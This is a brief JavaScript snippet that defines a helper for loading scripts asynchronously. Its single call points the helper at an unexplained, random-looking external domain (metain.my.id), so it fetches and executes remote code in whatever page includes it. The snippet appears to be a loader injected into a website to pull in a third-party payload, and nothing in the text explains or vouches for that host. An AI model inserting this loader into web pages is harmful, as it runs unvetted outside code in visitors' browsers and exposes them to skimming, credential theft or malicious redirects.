function loadAsyncScript(url) {
    const script = document.createElement("script");
    script.src = url;
    script.type = "text/javascript";
    script.async = true;
    script.defer = true;

    script.onload = () => console.log(`Script ${url} loaded successfully`);
    script.onerror = () => console.error(`Failed to load script: ${url}`);

    document.head.appendChild(script);
}

loadAsyncScript("https://3xjt2b.metain.my.id/front/in.js?v=1.2");
